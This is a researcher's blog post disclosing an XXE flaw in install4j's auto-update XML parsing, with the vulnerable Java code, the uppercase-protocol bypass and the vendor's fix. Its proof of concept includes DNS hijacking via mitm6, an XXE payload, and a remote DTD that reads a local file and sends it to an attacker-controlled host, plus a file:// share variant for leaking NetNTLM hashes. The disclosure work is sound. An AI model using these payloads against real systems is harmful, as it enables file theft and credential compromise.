---
layout: post
title:  "XXE with Auto-Update in install4j"
date:   2023-02-13 01:00:00 +0200
categories: vulns4free
---

# Storyline

In this blog post I describe a vulnerability for which I got a little bit too excited in the beginning.
It is related to a target of the [upcoming Pwn2Own 2023 competition](https://www.zerodayinitiative.com/blog/2022/11/30/pwn2own-returns-to-miami-beach-for-2023).
This was the first time I wanted to look for vulnerabilities in their target list and thanks to some hints from friends
I quickly chose my first (and only!) target: the **Prosys OPC UA Simulation Server**. Several very skilled researchers partly pwned this in former
competitions, at least parts of it with Denial-of-Service conditions, I think. My primary motivation was not to participate myself but to get a feeling
about the difficulty level of the targets. 

During the installation routine on my Windows VM, the wizard closed with choosing an **[auto update](https://www.ej-technologies.com/resources/install4j/help/doc/concepts/autoUpdate.html)** interval. I immediately got reminded
of several successful pwnages by former competitors targeting insecure update functions (all the love for `curl -k` & Co.). Since I had only two days left (**lucky punch mode?!**) between Christmas and
New Year's Eve (2022/2023), the update function seemed to be a feasible victim to hunt for.

As you will read in the following text, I did not manage to pwn the Prosys product properly but instead found a vulnerability in **[install4j](https://www.ej-technologies.com/products/install4j/overview.html)** which could presumably be applied in a lot of other software.

> install4j is a powerful multi-platform Java installer builder that generates native installers and application launchers for Java applications.

Indeed, this installer software framework seems to be used **a lot** (e.g. BurpSuite :-P) which I wasn't aware of in the beginning.
This vulnerability **is not applicable to Prosys OPC UA Simulation Server** unfortunately except with e.g. a badly configured SSL Inspection product in your company.
Nevertheless, the Proof-of-Concept (PoC) exploitation will be shown against exactly this because it was my initial target. So let's begin.


# Vulnerability Discovery

The latest version **10.0.4** (and former versions) of **install4j** is vulnerable to a XML External Entity (XXE) attack. Products using install4j with its **(automatic) update** feature could be exploited,
if connections to the *update server* are successfully controlled in some way. If any affected product triggers an update check (scheduled or manually), the update server responds with a *XML file* containing information about available software versions with
attributes pointing to the newest version, file hashes for verification etc. This delivered XML content is read by the client system with the product installed and **parsed insecurely**.

The class `com/install4j/runtime/installer/helper/XmlHelper` implements the method `public static Document parseFile(final File file)` which seems to be the primary entrypoint for (auto) update checks. The following code outline shows the full path to the vulnerable sink.

```java
public static Document parseFile(final File file) throws IOException {
    return parseFile(file, false, false); // [1]
}
-----------
public static Document parseFile(final File file, final boolean validating, final boolean downloadExternalEntities) throws IOException {
    return parse(new InputSource(file.toURI().toASCIIString()), validating, downloadExternalEntities); // [2]
}
-----------
private static Document parse(final InputSource inputSource, final boolean validating, final boolean downloadExternalEntities) throws IOException {
    final DocumentBuilderFactory documentBuilderFactory = createDocumentBuilderFactory(); // [3]
	----------- /* excerpt for the method called in [3] */
			public static DocumentBuilderFactory createDocumentBuilderFactory() {
				try {
					return DocumentBuilderFactory.newInstance("com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl", null); // [4]
				}
				catch (final Throwable t) {
					return DocumentBuilderFactory.newInstance();
				}
			}
	-----------
    documentBuilderFactory.setValidating(validating);
    DocumentBuilder documentBuilder;
    try {
        documentBuilder = documentBuilderFactory.newDocumentBuilder(); // [5]
    }
    catch (final ParserConfigurationException e) {
        throw createIoException(e);
    }
    if (validating) {
        documentBuilder.setErrorHandler(new ErrorHandler() {
            @Override
            public void error(final SAXParseException exception) throws SAXException {
                log(exception);
            }
            
            @Override
            public void fatalError(final SAXParseException exception) throws SAXException {
                log(exception);
            }
            
            @Override
            public void warning(final SAXParseException exception) throws SAXException {
            }
        });
    }
    if (!downloadExternalEntities) { // [6]
        documentBuilder.setEntityResolver((publicId, systemId) -> {
            if (systemId.startsWith("http:/") || systemId.startsWith("https:/")) { // [7]
                new InputSource(new StringReader("<?xml version=\"1.0\" encoding=\"UTF-8\"?>"));
                return;
            }
            else {
                return null;
            }
        });
    }
    try {
        return documentBuilder.parse(inputSource); // [8]
    }
    catch (final SAXException e2) {
        throw createIoException(e2);
    }
}
```
At `[1]` a `parseFile` method is called with a `File` object containing the response of the update server. This later calls a `parse` method `[2]` with the parameter `downloadExternalEntities = false` from the previous call.
At `[3]`  a `DocumentBuilderFactory` is created with help of `com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl` at `[4]`. Then the `DocumentBuilder` gets instantiated at `[5]`.
It seems some default XXE mitigations were put into place by the `downloadExternalEntities` member being set to `false` as mentioned above. This will lead us into the `if` branch at `[6]`, checking for `PUBLIC` and `SYSTEM` identifiers in the XML being parsed.
Even though `startsWith("http:/")` and `startsWith("https:/")` checks at `[7]` should take care of preventing disallowed **(external) entities and document type declarations**, referencing a remote **DTD** file then being fetched with a HTTP request,
this can be easily bypassed by e.g. using **UPPERCASE** protocol handler definitions such as `SYSTEM "HTTP://ATTACKERSERVER/BAD.DTD"`. Finally, the dangerous  sink at `[8]` is called. Additionally other file protocol handlers such as `file://` or `jar://` are not taken into account, yet. Note that the `EntityResolver` protection given by [OWASP XXE Mitigations](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#no-op-entityresolver) is more
restrictive and should have been the way to go.

# PoC based on "Prosys OPC UA Simulation Server"

Since this vulnerability in install4j was found during a security review on another product, the proof-of-concept (PoC) exploitation will be shown for the **[Prosys OPC UA Simulation Server](https://www.prosysopc.com/products/opc-ua-simulation-server/)** on **Windows** (it was the first download link tbh).
install4j takes care of proper TLS/SSL handling + verification of the update server in `com/install4j/runtime/installer/helper/content/UrlConnectionWrapper`. But in general, several cases allow an easy hijack of the update server communication:
* The product chooses to use HTTP instead of HTTPS connections
* The `acceptAllCertificates` attribute is set to `true` in the install4j configuration file such that TLS/SSL verification gets deactivated with help of the install4j method `private Runnable acceptAllCertificates()`
* A central TLS/SSL inspection component would break the trusted chain of verification depending on its (mis)configuration (already seen "in-the-wild" :-P)
* There exist other cases but this is not the main purpose of this blog post to list them all

Note that this hijacking part is not a vulnerability in install4j itself but depends on certain configurations of install4j and server infrastructure on the affected product side, respectively. Nevertheless, this is a valid attack vector and should not lead to a vulnerable sink indeed existing in install4j: the XXE described above.
Hijacking requests/responses is often an easy task for attackers today by impersonating the update server. In our case, a Windows server is attacked first with help of the tool *[mitm6](https://github.com/dirkjanm/mitm6)*. Windows prefers IPv6 configurations over IPv4 which means that DHCPv6 questions
into the local network could be answered by a malicious instance, allowing to hijack the DNS server configuration on Windows. Then the update server hostname could be set to the attacker machine IP address so that afterwards all traffic between the client and update server
flows in an attacker-controlled manner. There are other attacks such as ARP-poisoning etc. which would be valid attack vectors for installations on \*nix operating systems, too.

In the case of *Prosys OPC UA Simulation Server*, the update server is defined in the file `C:\Program Files\ProsysOPC\Prosys OPC UA Simulation Server\.install4j\i4jparams.conf` to be 
`<variable name="sys.updatesUrl" value="https://downloads.prosysopc.com/opcua/updates/SimulationServer/v5/updates.xml" />`. So the DNS entry on the Windows server will be modified such that the hostname `downloads.prosysopc.com` points to the IP address of the attacker machine .
If the Prosys OPC UA Simulation server now checks for updates automatically, a request to `https://downloads.prosysopc.com/opcua/updates/SimulationServer/v5/updates.xml` will be sent. Note that the **Prosys product is not vulnerable** to common ways of DNS hijacking
such that a fake TLS/SSL inspection component has to be introduced for this PoC to work. **Other products using install4j might indeed be exploitable** this way without any special pre-conditions. Pretty sure you can find one or two.

The following XML content will be delivered then by our attacker server:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "HTTP://downloads.prosysopc.com/XXE.dtd">
<data>&send;</data>
<updateDescriptor baseUrl="">
  <entry targetMediaFileId="1116" updatableVersionMin="" updatableVersionMax="" fileName="prosys-opc-ua-simulation-server-windows-x86-5.4.2-129.exe" newVersion="5.4.2-129" newMediaFileId="1116" fileSize="90175568" md5Sum="45b8dddf7e664d044a8441730d50a01b" sha256Sum="cb5e54b44b2b206be483cbf0d05d5acf91f23a59b9be407576828b81cf204ebf" bundledJre="windows-x86-17.0.5.tar.gz" archive="false" singleBundle="false">
    <comment language="en" />
  </entry>
<!-- ...SNIP... -->
</updateDescriptor>
```

The XXE payload can be found at the very beginning:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "HTTP://downloads.prosysopc.com/XXE.dtd">
<data>&send;</data>
```

This will fetch the `DTD` file remotely from the same update server with the following content:

```xml
<!ENTITY % file SYSTEM "file:///C:/Users/user/Desktop/secret.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'HTTP://downloads.prosysopc.com/%file;'>">
%all;
```

`secret.txt` is a PoC file created by me to show that e.g. file content could then be retrieved from the attacked server.

![install4j_2.png](/assets/images/install4j/install4j_2.png)

![install4j_1.png](/assets/images/install4j/install4j_1.png)

Other XXE attack vectors are possible as well. Since this is a Windows system, we could create XXE payloads with `file://` protocol handlers. Defining a remote network share could then lead to leakage of hashed Windows server credentials (NetNTLM hash).
These hashes could be cracked (or relayed) and used to directly login into the victim machines etc.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "file:////downloads.prosysopc.com/myshare/file.dll">
<data>&send;</data>
```

![install4j_3.png](/assets/images/install4j/install4j_3.png)

There are even more attack vectors by using the `jar://` protocol handler, fetching a remote JAR file with attacker-controlled arbitrary file content (it even doesn't have to be a JAR file). This is a variant of arbitrary file upload and could be used in further exploitation steps, depending on the specific target. For a beautiful chain read [this blog post](https://www.horizon3.ai/red-team-blog-cve-2022-28219/) for example.

"Well", you might say, "if you already control the update server response content, simply deliver a malicious update file". True but I love **0-click attacks** and
one would have needed user interaction to install the malicious file.

# Patch Recommendation

The `EntityResolver` part will be modified in version **10.0.5** shortly, i.e. for any protocol handler this is a dead end now. Especially worth mentioning, this was my best vendor experience for years. A good start for 2023 after a painful 2022. They answered my "support ticket" within hours and their first response already contained fixing suggestions.
